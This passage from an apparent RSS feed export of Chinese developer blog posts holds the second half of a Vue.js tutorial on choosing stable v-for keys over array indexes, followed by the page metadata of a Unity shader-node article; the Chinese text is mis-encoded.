Â Â Â Â <span class="hljs-keyword">if</span>Â (<span class="hljs-variable language_">this</span>.<span class="hljs-property">items</span>.<span class="hljs-property">length</span>Â &gt;=Â <span class="hljs-number">2</span>)Â {
Â Â Â Â Â Â <span class="hljs-keyword">const</span>Â [first,Â second]Â =Â [<span class="hljs-variable language_">this</span>.<span class="hljs-property">items</span>[<span class="hljs-number">0</span>],Â <span class="hljs-variable language_">this</span>.<span class="hljs-property">items</span>[<span class="hljs-number">1</span>]]
Â Â Â Â Â Â <span class="hljs-variable language_">this</span>.<span class="hljs-property">items</span>.<span class="hljs-title function_">splice</span>(<span class="hljs-number">0</span>,Â <span class="hljs-number">2</span>,Â second,Â first)
Â Â Â Â }
Â Â }
}
</code></pre>
<h3 data-id="heading-12">4.2 æ€§èƒ½å¯¹æ¯”æµ‹è¯•</h3>
<p>æˆ‘ä»¬åˆ›å»ºä¸€ä¸ªå¤§å‹åˆ—è¡¨æ¥æµ‹è¯•æ€§èƒ½å·®å¼‚ï¼š</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
Â Â <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
Â Â Â Â <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
Â Â Â Â Â Â <span class="hljs-tag">&lt;<span class="hljs-name">button</span>Â @<span class="hljs-attr">click</span>=<span class="hljs-string">"shuffleItems"</span>&gt;</span>éšæœºæ‰“ä¹±<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
Â Â Â Â Â Â <span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>æ“ä½œè€—æ—¶:Â {{Â operationTimeÂ }}ms<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>
Â Â Â Â <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
Â Â Â Â 
Â Â Â Â <span class="hljs-comment">&lt;!--Â ä½¿ç”¨ä¸‹æ ‡ä½œä¸ºÂ keyÂ --&gt;</span>
Â Â Â Â <span class="hljs-tag">&lt;<span class="hljs-name">div</span>Â <span class="hljs-attr">v-if</span>=<span class="hljs-string">"useIndexKey"</span>&gt;</span>
Â Â Â Â Â Â <span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>ä½¿ç”¨ä¸‹æ ‡ä½œä¸ºÂ keyÂ ({{Â items.lengthÂ }}Â é¡¹)<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span>
Â Â Â Â Â Â <span class="hljs-tag">&lt;<span class="hljs-name">ul</span>&gt;</span>
Â Â Â Â Â Â Â Â <span class="hljs-tag">&lt;<span class="hljs-name">li</span>Â <span class="hljs-attr">v-for</span>=<span class="hljs-string">"(item,Â index)Â inÂ items"</span>Â <span class="hljs-attr">:key</span>=<span class="hljs-string">"index"</span>&gt;</span>
Â Â Â Â Â Â Â Â Â Â {{Â item.nameÂ }}Â <span class="hljs-tag">&lt;<span class="hljs-name">input</span>Â <span class="hljs-attr">v-model</span>=<span class="hljs-string">"item.remark"</span>&gt;</span>
Â Â Â Â Â Â Â Â <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
Â Â Â Â Â Â <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span>
Â Â Â Â <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
Â Â Â Â 
Â Â Â Â <span class="hljs-comment">&lt;!--Â ä½¿ç”¨Â idÂ ä½œä¸ºÂ keyÂ --&gt;</span>
Â Â Â Â <span class="hljs-tag">&lt;<span class="hljs-name">div</span>Â <span class="hljs-attr">v-else</span>&gt;</span>
Â Â Â Â Â Â <span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>ä½¿ç”¨Â idÂ ä½œä¸ºÂ keyÂ ({{Â items.lengthÂ }}Â é¡¹)<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span>
Â Â Â Â Â Â <span class="hljs-tag">&lt;<span class="hljs-name">ul</span>&gt;</span>
Â Â Â Â Â Â Â Â <span class="hljs-tag">&lt;<span class="hljs-name">li</span>Â <span class="hljs-attr">v-for</span>=<span class="hljs-string">"itemÂ inÂ items"</span>Â <span class="hljs-attr">:key</span>=<span class="hljs-string">"item.id"</span>&gt;</span>
Â Â Â Â Â Â Â Â Â Â {{Â item.nameÂ }}Â <span class="hljs-tag">&lt;<span class="hljs-name">input</span>Â <span class="hljs-attr">v-model</span>=<span class="hljs-string">"item.remark"</span>&gt;</span>
Â Â Â Â Â Â Â Â <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
Â Â Â Â Â Â <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span>
Â Â Â Â <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
Â Â <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">export</span>Â <span class="hljs-keyword">default</span>Â {
Â Â <span class="hljs-title function_">data</span>(<span class="hljs-params"/>)Â {
Â Â Â Â <span class="hljs-keyword">return</span>Â {
Â Â Â Â Â Â <span class="hljs-attr">items</span>:Â [],
Â Â Â Â Â Â <span class="hljs-attr">useIndexKey</span>:Â <span class="hljs-literal">true</span>,
Â Â Â Â Â Â <span class="hljs-attr">operationTime</span>:Â <span class="hljs-number">0</span>
Â Â Â Â }
Â Â },
Â Â <span class="hljs-title function_">created</span>(<span class="hljs-params"/>)Â {
Â Â Â Â <span class="hljs-comment">//Â ç”ŸæˆÂ 1000Â æ¡æµ‹è¯•æ•°æ®</span>
Â Â Â Â <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">generateTestData</span>(<span class="hljs-number">1000</span>)
Â Â },
Â Â <span class="hljs-attr">methods</span>:Â {
Â Â Â Â <span class="hljs-title function_">generateTestData</span>(<span class="hljs-params">count</span>)Â {
Â Â Â Â Â Â <span class="hljs-keyword">const</span>Â fruitsÂ =Â [<span class="hljs-string">'è‹¹æœ'</span>,Â <span class="hljs-string">'é¦™è•‰'</span>,Â <span class="hljs-string">'æ©™å­'</span>,Â <span class="hljs-string">'è‘¡è„'</span>,Â <span class="hljs-string">'è¥¿ç“œ'</span>,Â <span class="hljs-string">'è è'</span>,Â <span class="hljs-string">'èŠ’æœ'</span>]
Â Â Â Â Â Â <span class="hljs-variable language_">this</span>.<span class="hljs-property">items</span>Â =Â <span class="hljs-title class_">Array</span>.<span class="hljs-title function_">from</span>({Â <span class="hljs-attr">length</span>:Â countÂ },Â <span class="hljs-function">(<span class="hljs-params">_,Â i</span>)Â =&gt;</span>Â ({
Â Â Â Â Â Â Â Â <span class="hljs-attr">id</span>:Â iÂ +Â <span class="hljs-number">1</span>,
Â Â Â Â Â Â Â Â <span class="hljs-attr">name</span>:Â <span class="hljs-string">`<span class="hljs-subst">${fruits[iÂ %Â fruits.length]}</span><span class="hljs-subst">${iÂ +Â <span class="hljs-number">1</span>}</span>`</span>,
Â Â Â Â Â Â Â Â <span class="hljs-attr">remark</span>:Â <span class="hljs-string">''</span>
Â Â Â Â Â Â }))
Â Â Â Â },
Â Â Â Â 
Â Â Â Â <span class="hljs-title function_">shuffleItems</span>(<span class="hljs-params"/>)Â {
Â Â Â Â Â Â <span class="hljs-keyword">const</span>Â startTimeÂ =Â performance.<span class="hljs-title function_">now</span>()
Â Â Â Â Â Â 
Â Â Â Â Â Â <span class="hljs-comment">//Â Fisher-YatesÂ æ´—ç‰Œç®—æ³•</span>
Â Â Â Â Â Â <span class="hljs-keyword">for</span>Â (<span class="hljs-keyword">let</span>Â iÂ =Â <span class="hljs-variable language_">this</span>.<span class="hljs-property">items</span>.<span class="hljs-property">length</span>Â -Â <span class="hljs-number">1</span>;Â iÂ &gt;Â <span class="hljs-number">0</span>;Â i--)Â {
Â Â Â Â Â Â Â Â <span class="hljs-keyword">const</span>Â jÂ =Â <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">floor</span>(<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>()Â *Â (iÂ +Â <span class="hljs-number">1</span>))
Â Â Â Â Â Â Â Â ;[<span class="hljs-variable language_">this</span>.<span class="hljs-property">items</span>[i],Â <span class="hljs-variable language_">this</span>.<span class="hljs-property">items</span>[j]]Â =Â [<span class="hljs-variable language_">this</span>.<span class="hljs-property">items</span>[j],Â <span class="hljs-variable language_">this</span>.<span class="hljs-property">items</span>[i]]
Â Â Â Â Â Â }
Â Â Â Â Â Â 
Â Â Â Â Â Â <span class="hljs-variable language_">this</span>.$nextTick(<span class="hljs-function">()Â =&gt;</span>Â {
Â Â Â Â Â Â Â Â <span class="hljs-variable language_">this</span>.<span class="hljs-property">operationTime</span>Â =Â performance.<span class="hljs-title function_">now</span>()Â -Â startTime
Â Â Â Â Â Â })
Â Â Â Â }
Â Â }
}
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<h2 data-id="heading-13">äº”ã€ç‰¹æ®Šæƒ…å†µä¸æœ€ä½³å®è·µ</h2>
<h3 data-id="heading-14">5.1 ä»€ä¹ˆæ—¶å€™å¯ä»¥ä½¿ç”¨ä¸‹æ ‡ä½œä¸º keyï¼Ÿ</h3>
<p>è™½ç„¶ä¸€èˆ¬ä¸æ¨èï¼Œä½†åœ¨æŸäº›ç‰¹å®šåœºæ™¯ä¸‹ï¼Œä½¿ç”¨ä¸‹æ ‡ä½œä¸º key æ˜¯å¯ä»¥æ¥å—çš„ï¼š</p>
<ol>
<li>1.Â <strong>é™æ€åˆ—è¡¨</strong>ï¼šåˆ—è¡¨æ°¸è¿œä¸ä¼šæ”¹å˜ï¼ˆå¢åˆ æ”¹æ’åºï¼‰</li>
</ol>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-comment">&lt;!--Â å›ºå®šçš„å¯¼èˆªèœå•Â --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">nav</span>&gt;</span>
Â Â <span class="hljs-tag">&lt;<span class="hljs-name">a</span>Â <span class="hljs-attr">v-for</span>=<span class="hljs-string">"(item,Â index)Â inÂ fixedNavItems"</span>Â 
Â Â Â Â Â <span class="hljs-attr">:key</span>=<span class="hljs-string">"index"</span>
Â Â Â Â Â <span class="hljs-attr">:href</span>=<span class="hljs-string">"item.link"</span>&gt;</span>
Â Â Â Â {{Â item.textÂ }}
Â Â <span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">nav</span>&gt;</span>
</code></pre>
<ol>
<li>2.Â <strong>çº¯å±•ç¤ºæ— çŠ¶æ€</strong>ï¼šåˆ—è¡¨é¡¹æ²¡æœ‰å†…éƒ¨çŠ¶æ€ï¼Œæ²¡æœ‰è¡¨å•å…ƒç´ </li>
</ol>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-comment">&lt;!--Â åªè¯»çš„ç»Ÿè®¡æ•°æ®å±•ç¤ºÂ --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">div</span>Â <span class="hljs-attr">v-for</span>=<span class="hljs-string">"(stat,Â index)Â inÂ statistics"</span>Â 
Â Â Â Â Â <span class="hljs-attr">:key</span>=<span class="hljs-string">"index"</span>
Â Â Â Â Â <span class="hljs-attr">class</span>=<span class="hljs-string">"stat-item"</span>&gt;</span>
Â Â <span class="hljs-tag">&lt;<span class="hljs-name">span</span>Â <span class="hljs-attr">class</span>=<span class="hljs-string">"label"</span>&gt;</span>{{Â stat.labelÂ }}:<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>
Â Â <span class="hljs-tag">&lt;<span class="hljs-name">span</span>Â <span class="hljs-attr">class</span>=<span class="hljs-string">"value"</span>&gt;</span>{{Â stat.valueÂ }}<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
</code></pre>
<h3 data-id="heading-15">5.2 æœ€ä½³å®è·µæŒ‡å—</h3>
<ol>
<li>1.Â <strong>ä¼˜å…ˆä½¿ç”¨å”¯ä¸€æ ‡è¯†ç¬¦</strong></li>
</ol>
<pre><code class="hljs language-bash" lang="bash">//Â ä»åç«¯è·å–çš„æ•°æ®é€šå¸¸æœ‰Â <span class="hljs-built_in">id</span>
:key=<span class="hljs-string">"item.id"</span>

//Â æ²¡æœ‰Â <span class="hljs-built_in">id</span>Â æ—¶å¯ä»¥ç”Ÿæˆ
:key=<span class="hljs-string">"`<span class="hljs-variable">${item.type}</span>-<span class="hljs-variable">${item.timestamp}</span>`"</span>
</code></pre>
<ol>
<li>2.Â <strong>å¤æ‚åœºæ™¯çš„ key ç”Ÿæˆç­–ç•¥</strong></li>
</ol>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-attr">computed</span>:Â {
Â Â <span class="hljs-title function_">itemsWithKey</span>(<span class="hljs-params"/>)Â {
Â Â Â Â <span class="hljs-keyword">return</span>Â <span class="hljs-variable language_">this</span>.<span class="hljs-property">items</span>.<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">item</span>Â =&gt;</span>Â ({
Â Â Â Â Â Â ...item,
Â Â Â Â Â Â <span class="hljs-comment">//Â ç»„åˆå¤šä¸ªå­—æ®µç”Ÿæˆå”¯ä¸€Â key</span>
Â Â Â Â Â Â <span class="hljs-attr">compositeKey</span>:Â <span class="hljs-string">`<span class="hljs-subst">${item.<span class="hljs-keyword">type</span>}</span>-<span class="hljs-subst">${item.category}</span>-<span class="hljs-subst">${item.createTime}</span>`</span>
Â Â Â Â }))
Â Â }
}
</code></pre>
<ol>
<li>3.Â <strong>é¿å…çš„å¸¸è§é”™è¯¯</strong></li>
</ol>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-comment">//Â é”™è¯¯ï¼šä½¿ç”¨å¯èƒ½é‡å¤çš„å€¼</span>
:key=<span class="hljs-string">"item.name"</span>Â Â <span class="hljs-comment">//Â åç§°å¯èƒ½é‡å¤</span>

<span class="hljs-comment">//Â é”™è¯¯ï¼šä½¿ç”¨ä¸ç¨³å®šçš„å€¼</span>
:key=<span class="hljs-string">"Math.random()"</span>Â Â <span class="hljs-comment">//Â æ¯æ¬¡æ¸²æŸ“éƒ½ä¸åŒï¼Œå®Œå…¨å¤±å»å¤ç”¨æ„ä¹‰</span>

<span class="hljs-comment">//Â é”™è¯¯ï¼šä½¿ç”¨å¯èƒ½å˜åŒ–çš„å€¼</span>
:key=<span class="hljs-string">"item.index"</span>Â Â <span class="hljs-comment">//Â å¦‚æœÂ itemÂ çš„å±æ€§ä¼šå˜åŒ–</span>
</code></pre>
<h3 data-id="heading-16">5.3 å®æˆ˜ä¸­çš„ key ç®¡ç†æ–¹æ¡ˆ</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">//Â æ–¹æ¡ˆ1ï¼šä½¿ç”¨Â SymbolÂ ç¡®ä¿å”¯ä¸€æ€§</span>
<span class="hljs-title function_">generateItems</span>(<span class="hljs-params"/>)Â {
Â Â <span class="hljs-keyword">return</span>Â dataFromAPI.<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">item</span>Â =&gt;</span>Â ({
Â Â Â Â ...item,
Â Â Â Â <span class="hljs-attr">uniqueKey</span>:Â <span class="hljs-title class_">Symbol</span>()
Â Â }))
}

<span class="hljs-comment">//Â æ–¹æ¡ˆ2ï¼šä½¿ç”¨Â UUID</span>
<span class="hljs-keyword">import</span>Â {Â v4Â <span class="hljs-keyword">as</span>Â uuidv4Â }Â <span class="hljs-keyword">from</span>Â <span class="hljs-string">'uuid'</span>

<span class="hljs-title function_">created</span>(<span class="hljs-params"/>)Â {
Â Â <span class="hljs-variable language_">this</span>.<span class="hljs-property">items</span>Â =Â <span class="hljs-variable language_">this</span>.<span class="hljs-property">initialItems</span>.<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">item</span>Â =&gt;</span>Â ({
Â Â Â Â ...item,
Â Â Â Â <span class="hljs-attr">uuid</span>:Â item.<span class="hljs-property">uuid</span>Â ||Â <span class="hljs-title function_">uuidv4</span>()
Â Â }))
}

<span class="hljs-comment">//Â æ–¹æ¡ˆ3ï¼šç»´æŠ¤ä¸€ä¸ªè‡ªå¢Â ID</span>
<span class="hljs-keyword">let</span>Â globalIdÂ =Â <span class="hljs-number">0</span>

<span class="hljs-keyword">export</span>Â <span class="hljs-keyword">default</span>Â {
Â Â <span class="hljs-title function_">data</span>(<span class="hljs-params"/>)Â {
Â Â Â Â <span class="hljs-keyword">return</span>Â {
Â Â Â Â Â Â <span class="hljs-attr">items</span>:Â []
Â Â Â Â }
Â Â },
Â Â <span class="hljs-attr">methods</span>:Â {
Â Â Â Â <span class="hljs-title function_">addItem</span>(<span class="hljs-params">newItem</span>)Â {
Â Â Â Â Â Â <span class="hljs-variable language_">this</span>.<span class="hljs-property">items</span>.<span class="hljs-title function_">push</span>({
Â Â Â Â Â Â Â Â ...newItem,
Â Â Â Â Â Â Â Â <span class="hljs-attr">localId</span>:Â ++globalIdÂ Â <span class="hljs-comment">//Â æœ¬åœ°ç”Ÿæˆçš„å”¯ä¸€ID</span>
Â Â Â Â Â Â })
Â Â Â Â }
Â Â }
}
</code></pre>
<h2 data-id="heading-17">å…­ã€Vue 3 ä¸­çš„å˜åŒ–ä¸æ³¨æ„äº‹é¡¹</h2>
<h3 data-id="heading-18">6.1 Vue 3 çš„ä¼˜åŒ–</h3>
<p>Vue 3 åœ¨è™šæ‹Ÿ DOM çš„ Diff ç®—æ³•ä¸Šåšäº†è¿›ä¸€æ­¥ä¼˜åŒ–ï¼Œä½† key çš„é‡è¦æ€§ä¾ç„¶ä¸å˜ã€‚Vue 3 å¼•å…¥çš„Â <code>Fragment</code>Â å’ŒÂ <code>Teleport</code>Â ç­‰ç‰¹æ€§ï¼Œä½¿å¾—æ­£ç¡®çš„ key ä½¿ç”¨æ›´åŠ é‡è¦ã€‚</p>
<h3 data-id="heading-19">6.2 Composition API ä¸­çš„åˆ—è¡¨æ¸²æŸ“</h3>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
Â Â <span class="hljs-tag">&lt;<span class="hljs-name">ul</span>&gt;</span>
Â Â Â Â <span class="hljs-tag">&lt;<span class="hljs-name">li</span>Â <span class="hljs-attr">v-for</span>=<span class="hljs-string">"itemÂ inÂ items"</span>Â <span class="hljs-attr">:key</span>=<span class="hljs-string">"item.id"</span>&gt;</span>
Â Â Â Â Â Â {{Â item.nameÂ }}
Â Â Â Â <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
Â Â <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span>Â <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span>Â {Â refÂ }Â <span class="hljs-keyword">from</span>Â <span class="hljs-string">'vue'</span>

<span class="hljs-keyword">const</span>Â itemsÂ =Â <span class="hljs-title function_">ref</span>([
Â Â {Â <span class="hljs-attr">id</span>:Â <span class="hljs-number">1</span>,Â <span class="hljs-attr">name</span>:Â <span class="hljs-string">'Apple'</span>Â },
Â Â {Â <span class="hljs-attr">id</span>:Â <span class="hljs-number">2</span>,Â <span class="hljs-attr">name</span>:Â <span class="hljs-string">'Banana'</span>Â }
])

<span class="hljs-comment">//Â æ·»åŠ æ–°é¡¹ç›®</span>
<span class="hljs-keyword">const</span>Â <span class="hljs-title function_">addItem</span>Â =Â (<span class="hljs-params"/>)Â =&gt;Â {
Â Â items.<span class="hljs-property">value</span>.<span class="hljs-title function_">push</span>({
Â Â Â Â <span class="hljs-attr">id</span>:Â <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>(),Â <span class="hljs-comment">//Â ä½¿ç”¨æ—¶é—´æˆ³ä½œä¸ºå”¯ä¸€ID</span>
Â Â Â Â <span class="hljs-attr">name</span>:Â <span class="hljs-string">'NewÂ Fruit'</span>
Â Â })
}
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<h2 data-id="heading-20">ä¸ƒã€æ€»ç»“</h2>
<h3 data-id="heading-21">å…³é”®è¦ç‚¹å›é¡¾</h3>
<ol>
<li>1.Â <strong>key çš„ä½œç”¨</strong>ï¼šå¸®åŠ© Vue è¯†åˆ«èŠ‚ç‚¹ï¼Œå®ç°é«˜æ•ˆçš„ DOM æ›´æ–°</li>
<li>2.Â <strong>ä¸‹æ ‡ä½œä¸º key çš„é—®é¢˜</strong>ï¼š</li>
<li>
<ul>
<li>â€¢ åˆ—è¡¨é¡ºåºå˜åŒ–æ—¶å¯¼è‡´çŠ¶æ€é”™ä¹±</li>
<li>â€¢ æ€§èƒ½ä¸‹é™ï¼ˆä¸å¿…è¦çš„ DOM æ“ä½œï¼‰</li>
<li>â€¢ ç”¨æˆ·ä½“éªŒé—®é¢˜ï¼ˆå¦‚è¡¨å•è¾“å…¥é”™ä½ï¼‰</li>
</ul>
</li>
<li>3.Â <strong>æ­£ç¡®ä½¿ç”¨ key çš„å¥½å¤„</strong>ï¼š</li>
<li>
<ul>
<li>â€¢ å‡†ç¡®å¤ç”¨ DOM èŠ‚ç‚¹</li>
<li>â€¢ ä¿æŒç»„ä»¶çŠ¶æ€</li>
<li>â€¢ æå‡æ¸²æŸ“æ€§èƒ½</li>
</ul>
</li>
</ol>
<h3 data-id="heading-22">å®æˆ˜å»ºè®®</h3>
<ol>
<li>1.Â <strong>é»˜è®¤ä½¿ç”¨å”¯ä¸€æ ‡è¯†ç¬¦</strong>ä½œä¸º key</li>
<li>2.Â <strong>å¦‚æœæ•°æ®æ²¡æœ‰å”¯ä¸€æ ‡è¯†</strong>ï¼Œåœ¨è·å–æ•°æ®æ—¶æ·»åŠ </li>
<li>3.Â <strong>é™æ€åˆ—è¡¨</strong>å¯ä»¥è€ƒè™‘ä½¿ç”¨ä¸‹æ ‡ï¼Œä½†è¦æ˜ç¡®æ ‡æ³¨åŸå› </li>
<li>4.Â <strong>å§‹ç»ˆè€ƒè™‘åˆ—è¡¨å¯èƒ½çš„å˜åŒ–</strong>ï¼ˆæ’åºã€è¿‡æ»¤ã€åˆ†é¡µç­‰ï¼‰</li>
</ol>
<h3 data-id="heading-23">æœ€åçš„æ€è€ƒ</h3>
<p>åœ¨ Vue å¼€å‘ä¸­ï¼Œkey çš„æ­£ç¡®ä½¿ç”¨æ˜¯ä¼˜åŒ–æ€§èƒ½ã€ç¡®ä¿æ­£ç¡®æ€§çš„é‡è¦ä¸€ç¯ã€‚è™½ç„¶ä½¿ç”¨ä¸‹æ ‡ä½œä¸º key çœ‹èµ·æ¥æ–¹ä¾¿ï¼Œä½†æ½œåœ¨çš„é—®é¢˜å¯èƒ½ä¼šåœ¨åç»­å¼€å‘ä¸­é€ æˆæ›´å¤§çš„éº»çƒ¦ã€‚</p>
<p>è®°ä½ï¼š<strong>å¥½çš„ key åº”è¯¥æ˜¯ç¨³å®šã€å”¯ä¸€ä¸”å¯é¢„æµ‹çš„</strong>ã€‚èŠ±ä¸€ç‚¹æ—¶é—´ä¸ºåˆ—è¡¨é¡¹é€‰æ‹©åˆé€‚çš„ keyï¼Œå¯ä»¥é¿å…è®¸å¤šéš¾ä»¥è°ƒè¯•çš„é—®é¢˜ï¼Œå¹¶æå‡åº”ç”¨çš„æ•´ä½“æ€§èƒ½ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ã€èŠ‚ç‚¹ã€‘[NormalUnpackèŠ‚ç‚¹]åŸç†è§£æä¸å®é™…åº”ç”¨]]></title>    <link>https://juejin.cn/post/7592759902675337262</link>    <guid>https://juejin.cn/post/7592759902675337262</guid>    <pubDate>2026-01-08T01:53:32.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592759902675337262" data-draft-id="7592759902675255342" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ã€èŠ‚ç‚¹ã€‘[NormalUnpackèŠ‚ç‚¹]åŸç†è§£æä¸å®é™…åº”ç”¨"/> <meta itemprop="keywords" content="æ¸¸æˆå¼€å‘,å›¾å½¢å­¦,Unity3D"/> <meta itemprop="datePublished" content="2026-01-08T01:53:32.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="SmalBox"/> <meta itemprop="url" content="https://juejin.cn/user/2218166695237532"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ã€èŠ‚ç‚¹ã€‘[NormalUnpackèŠ‚ç‚¹]åŸç†è§£æä¸å®é™…åº”ç”¨
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2218166695237532/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    SmalBox
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T01:53:32.000Z" title="Thu Jan 08 2026 01:53:32 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid 